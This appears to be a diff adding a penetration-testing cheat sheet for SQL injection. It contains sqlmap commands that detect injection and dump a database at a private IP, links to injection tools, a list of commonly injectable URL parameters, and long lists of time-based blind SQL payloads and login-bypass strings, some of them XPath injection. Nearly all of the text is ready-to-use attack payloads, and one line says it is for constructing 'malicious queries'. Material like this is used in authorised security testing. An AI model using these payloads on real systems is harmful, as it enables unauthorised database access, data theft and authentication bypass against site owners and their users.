@@ -1,1 +1,195 @@
+🗲SqlMap
+  #sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user  -> Testing on parameter names "user", we'll get confirmation
+  #sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump  -> Dumping database
+  #sqlmap.py -r /home/request.txt --dbs -> Login page username sqli detect.(https://infosecwriteups.com/sql-injection-for-beginners-using-sqlmap-36e091e8a070)
+  #sqlmap.py -r /home/request.txt --dbs --level 5 -> parameter sql detect.(https://infosecwriteups.com/sql-injection-for-beginners-using-sqlmap-part-2-53e9775b67f5)
 
+
+
+🗲Ghauri (https://github.com/r0oth3x49/ghauri)
+
+🗲SqlFinder (https://github.com/americo/sqlifinder/tree/main)
+
+🗲Blisqy (https://github.com/JohnTroony/Blisqy)
+
+
+#(Knowing what database we are dealing with makes it easier to understand how to construct our malicious queries)
+
+Top 25 SQL Injection Parameters for @trbughunters
+
+?id=
+?page=
+?dir=
+?search=
+?category=
+?file=
+?class=
+?url=
+?news=
+?item=
+?menu=
+?lang=
+?name=
+?ref=
+?title=
+?view=
+?topic=
+?thread=
+?type=
+?date=
+?form=
+?join=
+?main=
+?nav=
+?region=
+
+#Firs detect vulnerability.
+->id=1  id=2-1 same ? or 500 internal server error for the following payload ?
+&apos
+" or "1"+"2
+" or "1"="-2"--
+" or "1+2"/*
+" or "1"="1
+" or "1"="1"--
+" or "1"="1"/*
+" or "1"="1"#
+" or 1=1
+" or 1=1 --
+" or 1=1 -
+" or 1=1--
+" or 1=1/*
+" or 1=1#
+" or 1=1-
+' or '1'='1
+' or ''=''
+' or 1]%00
+' or /* or '
+' or "a" or '
+' or 1 or '
+' or true() or '
+# from wapiti
+sleep(5)#
+1 or sleep(5)#
+" or sleep(5)#
+' or sleep(5)#
+" or sleep(5)="
+' or sleep(5)='
+1) or sleep(5)#
+") or sleep(5)="
+') or sleep(5)='
+1)) or sleep(5)#
+")) or sleep(5)="
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(5)--
+1 or pg_sleep(5)--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+1) or pg_sleep(5)--
+") or pg_sleep(5)--
+') or pg_sleep(5)--
+1)) or pg_sleep(5)--
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
+waitfor delay '00:00:05'
+waitfor delay '00:00:05'--
+waitfor delay '00:00:05'#
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))--
+or benchmark(50000000,MD5(1))#
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or pg_SLEEP(5)
+or pg_SLEEP(5)--
+or pg_SLEEP(5)#
+'\"
+AnD SLEEP(5)
+AnD SLEEP(5)--
+AnD SLEEP(5)#
+&&SLEEP(5)
+&&SLEEP(5)--
+&&SLEEP(5)#
+' AnD SLEEP(5) ANd '1
+'&&SLEEP(5)&&'1
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)--
+ORDER BY SLEEP(5)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
++ SLEEP(10) + '
+SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+  
+🗲Login Page🗲
+USERNAME : admin' UNION SELECT '12345' AS password#    PASSWORD : 12345
+admin' or '1'='1
+" or "1"="1
+" or "1"="1"--
+" or "1"="1"/*
+" or "1"="1"#
+" or 1=1
+" or 1=1 --
+" or 1=1 -
+" or 1=1--
+" or 1=1/*
+" or 1=1#
+" or 1=1-
+' or '1'='1
+' or ''=''
+' or 1]%00
+' or /* or '
+' or "a" or '
+' or 1 or '
+' or true() or '
+'or string-length(name(.))<10 or'
+'or contains(name,'adm') or'
+'or contains(.,'adm') or'
+'or position()=2 or'
+admin' or '
+admin' or '1'='2
+") or "1"="1
+") or "1"="1"--
+") or "1"="1"/*
+") or "1"="1"#
+") or ("1"="1
+") or ("1"="1"--
+") or ("1"="1"/*
+") or ("1"="1"#
+) or '1`='1-
+or 1=1 group by round(rand(0)) having min(0);#
